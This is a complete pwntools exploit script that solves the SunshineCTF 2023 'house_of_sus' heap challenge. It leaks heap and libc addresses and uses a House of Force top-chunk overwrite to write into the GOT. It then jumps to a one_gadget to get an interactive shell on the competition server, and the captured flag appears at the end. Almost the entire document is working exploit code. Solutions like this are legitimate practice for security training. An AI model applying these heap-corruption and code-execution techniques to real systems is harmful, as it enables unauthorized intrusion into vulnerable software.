#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./house_of_sus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("chal.2023.sunshinectf.games", 23001)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'joining game: ')
	heap_leak = int(r.recvline().strip(), 16)
	success(f'{hex(heap_leak)=}')

	def create_chunk(size, contents):
		r.sendlineafter(b'meeting', b'3')
		r.sendline(size + b' ' + contents)
		r.sendlineafter(b'You', b'1')

	create_chunk(b'32', (b'A' * 40) + p64(0xFFFFFFFFFFFFFFFF))

	heap_addr = heap_leak + (0x127D6C8 - 0x127C660) - 24 + 48
	wrap_distance = 0xFFFFFFFFFFFFFFFF - heap_addr + exe.sym['tasks']
	create_chunk(str(wrap_distance).encode(), b'BBBBBBBB')

	create_chunk(b'128', 5 * p64(exe.got['free']))

	r.sendlineafter(b'meeting', b'1')
	r.recvuntil(b'choice: \n')
	free_leak = u64(r.recv(6).ljust(8, b'\x00'))
	libc.address = free_leak - libc.sym['free']
	success(f'{hex(free_leak)=}')

	create_chunk(b'32', (b'A' * 40) + p64(0xFFFFFFFFFFFFFFFF))
	create_chunk(str(0xFFFFFFFFFFFFFFFF - 0x168).encode(), (b'f' * 8))
	
	one_gadgets = [0x4F2A5, 0x4F302, 0x10A2FC]
	og = libc.address + one_gadgets[0]
	malloc_call_addr = 0x401857
	create_chunk(b'256', 3 * p64(og) + p64(malloc_call_addr))

	r.interactive()


if __name__ == "__main__":
	main()

# sun{4Re_y0U_th3_!mP0st3r_v3rY_su55!}
